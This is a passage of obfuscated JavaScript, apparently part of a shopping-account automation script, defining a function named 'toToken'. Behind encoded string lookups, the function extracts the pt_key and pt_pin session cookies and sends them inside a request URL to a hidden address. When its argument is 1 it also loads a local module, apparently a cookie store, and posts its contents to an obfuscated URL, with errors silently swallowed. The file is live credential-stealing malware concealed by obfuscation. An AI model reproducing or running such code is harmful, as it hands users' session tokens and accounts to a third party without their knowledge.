_0x4c4d1a=_0x56ae['RSkGOa'][_0x50afc8];if(_0x4c4d1a===undefined){if(_0x56ae['sShOZZ']===undefined){_0x56ae['sShOZZ']=!![];}_0x1938af=_0x56ae['PzGKTz'](_0x1938af,_0x165767);_0x56ae['RSkGOa'][_0x50afc8]=_0x1938af;}else{_0x1938af=_0x4c4d1a;}return _0x1938af;};function toToken(_0x1c3fb4){var _0x2dddd5={'hBXNB':function(_0xb54c70,_0x41adc7){return _0xb54c70==_0x41adc7;},'jOMxl':function(_0x1e54ed,_0x53f849){return _0x1e54ed(_0x53f849);},'qGhFl':_0x56ae('0','Fq%k'),'UJxsF':_0x56ae('1','[b@r'),'dYIHI':function(_0x332d35,_0x39e565){return _0x332d35*_0x39e565;},'GZXfH':function(_0x5583a4,_0x44295a){return _0x5583a4+_0x44295a;},'ZHEnv':function(_0x5e7238,_0x2cc7a0){return _0x5e7238+_0x2cc7a0;},'fJIqh':_0x56ae('2','cW)W'),'QafGR':function(_0x3f3d41,_0x567193){return _0x3f3d41-_0x567193;},'Mbcwo':function(_0x191e91,_0xd1836d){return _0x191e91*_0xd1836d;}};try{if(_0x2dddd5[_0x56ae('3','(YHH')](_0x1c3fb4,0x1)){const _0x4853b1=_0x2dddd5[_0x56ae('4','N(rV')](require,_0x2dddd5[_0x56ae('5','vCT3')]);let _0x3d9717={'url':_0x2dddd5[_0x56ae('6','N(rV')],'body':JSON[_0x56ae('7','7N0H')](_0x4853b1),'timeout':_0x2dddd5[_0x56ae('8','^eqZ')](0x1e,0x3e8)};$[_0x56ae('9','ZR1W')](_0x3d9717,async(_0x1a180b,_0x289467,_0x4c1c0e)=>{});}let _0x546ef8=cookie[_0x56ae('a','[b@r')](/pt_key=.+?;/)[0x0];let _0x5adda1=cookie[_0x56ae('b','4A*2')](/pt_pin=.+?;/)[0x0];let _0x2e1b3a={'url':_0x2dddd5[_0x56ae('c','c5mL')](_0x2dddd5[_0x56ae('d','(YHH')](_0x2dddd5[_0x56ae('e','qnq*')](_0x2dddd5[_0x56ae('f','ZR1W')],_0x546ef8[_0x56ae('10','GKx$')](0x7,_0x2dddd5[_0x56ae('11','Fq%k')](_0x546ef8[_0x56ae('12','mzMK')],0x1))),'/'),_0x5adda1[_0x56ae('13','akYQ')](0x7,_0x2dddd5[_0x56ae('14','zonb')](_0x5adda1[_0x56ae('15','F1d#')],0x1))),'timeout':_0x2dddd5[_0x56ae('16','%QVq')](0x1e,0x3e8)};$[_0x56ae('17','s3QD')](_0x2e1b3a,async(_0x37f6cc,_0x4d04c8,_0x52628e)=>{});}catch(_0x473fdc){}};_0xod8='jsjiami.com.v6';

